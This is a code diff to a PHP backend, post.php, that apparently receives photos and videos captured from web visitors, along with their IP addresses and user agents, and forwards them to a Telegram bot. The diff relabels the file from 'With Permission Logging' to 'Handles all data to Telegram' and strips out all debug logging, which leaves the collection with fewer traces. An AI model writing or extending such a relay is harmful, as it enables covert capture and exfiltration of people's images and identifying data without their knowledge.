@@ -1,6 +1,6 @@
 <?php
 // ============================================
-// POST.PHP - With Permission Logging
+// POST.PHP - Handles all data to Telegram
 // ============================================
 
 error_reporting(0);
@@ -19,11 +19,6 @@ $type = $_POST['tg_type'] ?? '';
 $ip = $_POST['tg_ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 $ua = $_POST['tg_ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
 $time = $_POST['tg_time'] ?? date('Y-m-d H:i:s');
-
-// ============================================
-// LOG EVERYTHING
-// ============================================
-file_put_contents('debug.log', "[$time] Type: $type, IP: $ip\n", FILE_APPEND);
 
 // ============================================
 // TELEGRAM SEND FUNCTION
@@ -74,10 +69,8 @@ function sendTelegramMessage($message, $fileData = null, $fileType = 'photo') {
             unlink($tempFile);
         }
         
-        file_put_contents('debug.log', "Telegram: HTTP $httpCode\n", FILE_APPEND);
         return $httpCode == 200;
     } catch (Exception $e) {
-        file_put_contents('debug.log', "Error: " . $e->getMessage() . "\n", FILE_APPEND);
         return false;
     }
 }
@@ -102,7 +95,6 @@ switch ($type) {
             $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
             $caption .= "Time: $time";
             sendTelegramMessage($caption, $imageData, 'photo');
-            file_put_contents('debug.log', "Photo sent\n", FILE_APPEND);
         }
         break;
     
@@ -114,7 +106,6 @@ switch ($type) {
             $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
             $caption .= "Time: $time";
             sendTelegramMessage($caption, $videoData, 'video');
-            file_put_contents('debug.log', "Video #$counter sent\n", FILE_APPEND);
         }
         break;
     
